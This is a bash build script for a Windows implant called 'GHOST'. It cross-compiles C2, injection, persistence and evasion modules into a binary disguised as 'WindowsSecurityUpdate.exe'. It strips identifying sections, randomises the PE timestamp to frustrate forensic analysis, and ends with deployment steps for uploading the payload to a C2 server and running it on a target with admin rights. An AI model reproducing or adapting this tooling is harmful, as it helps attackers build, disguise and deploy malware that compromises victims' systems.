#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  GHOST build script — cross-compile for Windows x64 via MinGW-w64 on Linux.
#
#  Outputs
#    build/WindowsSecurityUpdate.exe   — stage-2 implant
#
#  Usage
#    ./build.sh                — release (strip, O2, no debug symbols)
#    ./build.sh --debug        — debug symbols, no strip, -DDEBUG
#    ./build.sh --setup        — install MinGW-w64 + optional tools
#    ./build.sh --clean        — remove build/ directory
#
#  One-time setup
#    sudo ./build.sh --setup && chmod +x build.sh
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# ── Toolchain ─────────────────────────────────────────────────────────────────
CXX="x86_64-w64-mingw32-g++"
WINDRES="x86_64-w64-mingw32-windres"
STRIP_TOOL="x86_64-w64-mingw32-strip"

# ── Final output filename ────────────────────────────────────────────────────
IMPLANT_OUT="WindowsSecurityUpdate.exe"
OUT_DIR="build"

# ─────────────────────────────────────────────────────────────────────────────
#  --setup
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--setup" ]]; then
    echo "[*] Installing MinGW-w64 cross-compilation toolchain…"
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq
        sudo apt-get install -y mingw-w64 python3
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y mingw64-gcc-c++ python3
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm mingw-w64-gcc python3
    else
        echo "[!] Unknown package manager — install mingw-w64 manually."
        exit 1
    fi
    echo "[+] Setup complete. Run './build.sh' to compile."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  --clean
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--clean" ]]; then
    rm -rf "$OUT_DIR"
    echo "[+] Cleaned."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  Verify toolchain present
# ─────────────────────────────────────────────────────────────────────────────
if ! command -v "$CXX" &>/dev/null; then
    echo "[!] $CXX not found. Run: sudo ./build.sh --setup"
    exit 1
fi
echo "[*] Toolchain: $($CXX --version | head -1)"

# ─────────────────────────────────────────────────────────────────────────────
#  Parse flags
# ─────────────────────────────────────────────────────────────────────────────
DEBUG=0
for arg in "$@"; do
    case "$arg" in
        --debug) DEBUG=1 ;;
    esac
done

mkdir -p "$OUT_DIR"

# ─────────────────────────────────────────────────────────────────────────────
#  Shared compiler flags
# ─────────────────────────────────────────────────────────────────────────────
COMMON_FLAGS=(
    -std=c++17
    -DUNICODE -D_UNICODE
    -D_WIN32_WINNT=0x0A00
    -DNTDDI_VERSION=0x0A000008
    -mwindows
    -static -static-libgcc -static-libstdc++
    -fno-rtti
    -ffunction-sections
    -fdata-sections
    -fstack-protector-strong
    -I include
    -Wall -Wextra
    -Wno-unused-parameter
    -Wno-cast-function-type
    -Wno-missing-field-initializers
    -Wl,--gc-sections
    -Wl,--nxcompat
    -Wl,--dynamicbase
    -Wl,--high-entropy-va
)

if [[ $DEBUG -eq 1 ]]; then
    OPT_FLAGS=(-O0 -g3 -DDEBUG -DGHOST_DEBUG)
    DO_STRIP=0
    echo "[*] Mode: DEBUG"
else
    OPT_FLAGS=(-O2 -D_FORTIFY_SOURCE=2)
    DO_STRIP=1
    echo "[*] Mode: RELEASE"
fi

# ─────────────────────────────────────────────────────────────────────────────
#  randomise_pe_timestamp
# ─────────────────────────────────────────────────────────────────────────────
randomise_pe_timestamp() {
    local binary="$1"
    python3 - "$binary" <<'PYEOF' 2>/dev/null || echo "[-] python3 unavailable"
import sys, struct, random
path = sys.argv[1]
with open(path, 'r+b') as f:
    data = bytearray(f.read())
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_off:pe_off+4] != b'PE\x00\x00':
        sys.exit(0)
    ts_off = pe_off + 8
    rand_ts = random.randint(1514764800, 1735603200)
    struct.pack_into('<I', data, ts_off, rand_ts)
    f.write(data)
PYEOF
}

# ─────────────────────────────────────────────────────────────────────────────
#  strip_binary
# ─────────────────────────────────────────────────────────────────────────────
strip_binary() {
    local binary="$1"
    "$STRIP_TOOL" \
        --strip-all \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        "$binary"
}

# ─────────────────────────────────────────────────────────────────────────────
#  Build: WindowsSecurityUpdate.exe  (implant)
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "[*] Resources: ghost.rc → $OUT_DIR/ghost.res"
"$WINDRES" resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling $IMPLANT_OUT …"
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" \
    src/main.cpp         \
    src/syscalls.cpp     \
    src/evasion.cpp      \
    src/injection.cpp    \
    src/persistence.cpp  \
    src/c2.cpp           \
    src/utils.cpp        \
    "$OUT_DIR/ghost.res" \
    -lntdll              \
    -luser32             \
    -ladvapi32           \
    -lole32              \
    -loleaut32           \
    -lwbemuuid           \
    -lbcrypt             \
    -lwinhttp            \
    -ldnsapi             \
    -lshlwapi            \
    -lgdi32              \
    -lshell32            \
    -o "$OUT_DIR/$IMPLANT_OUT"

if [[ $DO_STRIP -eq 1 ]]; then
    echo "[*] Stripping $IMPLANT_OUT …"
    strip_binary "$OUT_DIR/$IMPLANT_OUT"
    randomise_pe_timestamp "$OUT_DIR/$IMPLANT_OUT"
fi

SZ_IMPLANT=$(du -sh "$OUT_DIR/$IMPLANT_OUT" | cut -f1)
echo "[+] $IMPLANT_OUT  $SZ_IMPLANT"

# ─────────────────────────────────────────────────────────────────────────────
#  Summary
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  GHOST — BUILD COMPLETE                                          ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
printf "║  %-30s  %s\n" "$IMPLANT_OUT"  "$SZ_IMPLANT  ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  DEPLOYMENT:                                                    ║"
printf "║  1. Upload: python server/c2_cli.py payload upload build/%s\n" "$IMPLANT_OUT"
echo "║  2. Run on target (admin required)                              ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""